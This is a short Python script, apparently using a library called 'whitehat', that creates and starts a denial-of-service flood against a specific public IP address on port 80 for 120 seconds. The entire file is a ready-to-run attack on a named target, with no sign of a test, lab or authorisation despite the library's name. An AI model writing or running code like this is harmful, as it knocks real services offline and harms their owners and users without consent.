import whitehat

ddos = whitehat.DDoS(IP="51.38.92.223", PORT=80, duration=120)
ddos.start()
